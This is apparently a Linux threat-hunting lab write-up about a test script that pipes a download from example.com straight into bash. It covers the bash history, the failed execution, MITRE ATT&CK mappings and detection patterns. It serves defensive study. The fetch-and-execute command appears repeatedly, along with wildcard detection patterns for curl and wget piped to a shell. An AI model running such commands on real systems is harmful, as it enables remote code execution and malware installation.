# Linux Threat Hunting: Suspicious Script Execution Investigation

## Objective

To investigate a potentially malicious script execution pattern involving the download and immediate execution of remote content using Bash.

## Scenario Overview

A shell script was created and executed containing the following command:

```bash
curl http://example.com/payload.sh | bash
```

This command attempts to download content from a remote web server and immediately execute it using the Bash shell.

## Investigation Timeline

### Script Creation

Command:

```bash
echo 'curl http://example.com/payload.sh | bash' > test.sh
```

Purpose:

* Creates a shell script named `test.sh`
* Stores a remote download-and-execute command

### Permission Modification

Command:

```bash
chmod +x test.sh
```

Purpose:

* Grants executable permissions to the script

### Script Execution

Command:

```bash
./test.sh
```

Purpose:

* Executes the shell script

## Evidence Collected

### Bash History

```text
20 echo 'curl http://example.com/payload.sh | bash' >test.sh
21 chmod +x test.sh
22 ./test.sh
```

### Script Contents

```bash
curl http://example.com/payload.sh | bash
```

### Execution Output

```text
bash: syntax error near unexpected token '<'
<!doctype html><html ...
```

## Analysis

The command successfully established an outbound connection and downloaded content from the specified URL.

However, instead of receiving a shell script, the server returned an HTML webpage. The downloaded content began with:

```html
<!doctype html>
```

The output was piped directly into Bash, which attempted to interpret the HTML document as shell commands.

As a result, execution failed and Bash generated a syntax error.

## Security Significance

The following execution pattern is considered highly suspicious:

```bash
curl <URL> | bash
```

This technique is frequently used by attackers to:

* Download malware
* Install persistence mechanisms
* Execute remote payloads
* Establish command-and-control access

Because the downloaded content is executed immediately, users have no opportunity to inspect or validate the code beforehand.

## Investigation Findings

| Finding                       | Result      |
| ----------------------------- | ----------- |
| Remote Content Downloaded     | Yes         |
| Direct Execution Attempted    | Yes         |
| Script Successfully Executed  | No          |
| Malware Installed             | No Evidence |
| Persistence Created           | No Evidence |
| Privilege Escalation Observed | No          |
| Outbound Network Activity     | Yes         |

## MITRE ATT&CK Mapping

### Command and Scripting Interpreter

ID: T1059

Description:
Execution of commands using shell interpreters such as Bash.

### Ingress Tool Transfer

ID: T1105

Description:
Transfer of files or payloads from a remote system.

### User Execution

ID: T1204

Description:
Execution of malicious content through user action.

## Detection Opportunities

SOC teams should monitor for:

* curl piped directly into bash
* wget piped into sh
* Remote script downloads
* Unusual outbound HTTP connections
* Execution of downloaded content

Example suspicious patterns:

```bash
curl * | bash
```

```bash
wget -qO- * | sh
```

## Risk Assessment

Severity: Medium

Although the execution attempt failed, the behavior matches a commonly abused attack technique used during malware deployment and initial access operations.

In a production environment, such activity should be investigated to determine whether a malicious payload was downloaded and executed.

## Conclusion

A suspicious command execution pattern was identified involving the download and immediate execution of remote content using Bash. The downloaded content was an HTML document rather than a valid shell script, causing execution to fail. Despite the unsuccessful execution, the observed behavior closely resembles techniques commonly used by attackers to deploy malware and execute remote payloads.
